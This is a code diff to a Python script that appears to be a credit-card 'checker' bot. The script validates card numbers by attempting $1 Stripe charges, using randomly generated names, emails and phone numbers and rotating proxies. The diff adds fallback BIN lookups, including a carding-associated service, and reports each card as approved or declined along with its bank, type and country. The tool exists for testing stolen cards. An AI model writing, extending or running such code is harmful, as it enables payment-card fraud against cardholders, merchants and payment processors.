@@ -58,9 +58,9 @@ def get_random_proxy():
     except:
         return None
 
-# BIN lookup function - UPDATED with only binlist.net API
+# BIN lookup function - UPDATED with multiple reliable APIs
 def get_bin_info(bin_number):
-    """Get BIN information using reliable binlist.net API"""
+    """Get BIN information using multiple reliable APIs with fallback"""
     if not bin_number or len(bin_number) < 6:
         return {
             'bank': 'Unavailable',
@@ -73,57 +73,83 @@ def get_bin_info(bin_number):
     
     bin_code = bin_number[:6]
     
-    try:
-        # Use only binlist.net API that works well
-        api_url = f"https://lookup.binlist.net/{bin_code}"
-        
-        headers = {
-            'Accept': 'application/json',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        }
-        
-        response = requests.get(api_url, headers=headers, timeout=10, verify=False)
-        
-        if response.status_code == 200:
-            data = response.json()
+    # Try multiple APIs in sequence
+    apis_to_try = [
+        f"https://lookup.binlist.net/{bin_code}",
+        f"https://bin-ip-checker.p.rapidapi.com/?bin={bin_code}",
+        f"https://bins.antipublic.cc/bins/{bin_code}",
+    ]
+    
+    headers = {
+        'Accept': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    }
+    
+    for api_url in apis_to_try:
+        try:
+            print(f"Trying BIN API: {api_url}")
+            response = requests.get(api_url, headers=headers, timeout=10, verify=False)
             
-            # Parse binlist.net response format
-            bin_info = {
-                'bank': data.get('bank', {}).get('name', 'Unavailable'),
-                'country': data.get('country', {}).get('name', 'Unknown'),
-                'brand': data.get('scheme', 'Unknown'),
-                'type': data.get('type', 'Unknown'),
-                'level': data.get('brand', 'Unknown'),  # binlist doesn't have level field
-                'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
-            }
-            
-            # Clean up the values
-            for key in ['bank', 'country', 'brand', 'type', 'level']:
-                if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None']:
-                    bin_info[key] = 'Unknown'
-            
-            return bin_info
-        else:
-            print(f"BIN API failed with status: {response.status_code}")
-            return {
-                'bank': 'Unavailable',
-                'country': 'Unknown',
-                'brand': 'Unknown',
-                'type': 'Unknown',
-                'level': 'Unknown',
-                'emoji': '🏳️'
-            }
-        
-    except Exception as e:
-        print(f"BIN lookup error: {str(e)}")
-        return {
-            'bank': 'Unavailable',
-            'country': 'Unknown',
-            'brand': 'Unknown',
-            'type': 'Unknown',
-            'level': 'Unknown',
-            'emoji': '🏳️'
-        }
+            if response.status_code == 200:
+                data = response.json()
+                bin_info = {}
+                
+                # Parse based on API response format
+                if 'binlist.net' in api_url:
+                    # binlist.net format
+                    bin_info = {
+                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
+                        'country': data.get('country', {}).get('name', 'Unknown'),
+                        'brand': data.get('scheme', 'Unknown'),
+                        'type': data.get('type', 'Unknown'),
+                        'level': data.get('brand', 'Unknown'),
+                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
+                    }
+                elif 'antipublic.cc' in api_url:
+                    # antipublic.cc format
+                    bin_info = {
+                        'bank': data.get('bank', 'Unavailable'),
+                        'country': data.get('country', 'Unknown'),
+                        'brand': data.get('vendor', 'Unknown'),
+                        'type': data.get('type', 'Unknown'),
+                        'level': data.get('level', 'Unknown'),
+                        'emoji': get_country_emoji(data.get('country_code', ''))
+                    }
+                else:
+                    # Generic format
+                    bin_info = {
+                        'bank': data.get('bank', {}).get('name', data.get('bank_name', 'Unavailable')),
+                        'country': data.get('country', {}).get('name', data.get('country_name', 'Unknown')),
+                        'brand': data.get('scheme', data.get('brand', 'Unknown')),
+                        'type': data.get('type', data.get('card_type', 'Unknown')),
+                        'level': data.get('level', data.get('card_level', 'Unknown')),
+                        'emoji': get_country_emoji(data.get('country', {}).get('code', data.get('country_code', '')))
+                    }
+                
+                # Clean up the values
+                for key in ['bank', 'country', 'brand', 'type', 'level']:
+                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
+                        bin_info[key] = 'Unknown'
+                
+                # If we got valid data, return it
+                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
+                    print(f"BIN info successfully retrieved from {api_url}")
+                    return bin_info
+                    
+        except Exception as e:
+            print(f"BIN API {api_url} failed: {str(e)}")
+            continue
+    
+    # If all APIs failed, return default values
+    print("All BIN APIs failed, using default values")
+    return {
+        'bank': 'Unavailable',
+        'country': 'Unknown',
+        'brand': 'Unknown',
+        'type': 'Unknown',
+        'level': 'Unknown',
+        'emoji': '🏳️'
+    }
 
 def get_country_emoji(country_code):
     """Convert country code to emoji"""
@@ -181,6 +207,11 @@ def test_charge(cc_line):
         
         ccn, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
         
+        # FIRST: Get BIN information before anything else
+        print("Getting BIN information...")
+        bin_info = get_bin_info(ccn[:6])
+        print(f"BIN Info retrieved: {bin_info}")
+        
         name = random_name()
         email = random_email(name)
         phone = random_phone()
@@ -217,7 +248,6 @@ def test_charge(cc_line):
         if pid == "FAILED":
             error_msg = apx.get('error', {}).get('message', 'Unknown error')
             elapsed_time = time.time() - start_time
-            bin_info = get_bin_info(ccn[:6])
             
             return f"""
 ❌ DECLINED CC
@@ -226,9 +256,9 @@ def test_charge(cc_line):
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe $1 Charge
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand')} - {bin_info.get('type')} - {bin_info.get('level')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country')} {bin_info.get('emoji')}
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -319,7 +349,6 @@ def test_charge(cc_line):
         apx1 = response1.json()
         
         elapsed_time = time.time() - start_time
-        bin_info = get_bin_info(ccn[:6])
         
         status, reason, approved = check_status(apx1)
 
@@ -330,9 +359,9 @@ def test_charge(cc_line):
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe $1 Charge
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand')} - {bin_info.get('type')} - {bin_info.get('level')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country')} {bin_info.get('emoji')}
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -340,6 +369,8 @@ def test_charge(cc_line):
 
     except Exception as e:
         elapsed_time = time.time() - start_time
+        # Get BIN info even for errors to ensure we have it
+        bin_info = get_bin_info(cc_line.split('|')[0][:6]) if '|' in cc_line else get_bin_info('')
         return f"""
 ❌ ERROR
 
@@ -347,6 +378,9 @@ def test_charge(cc_line):
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe $1 Charge
 
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
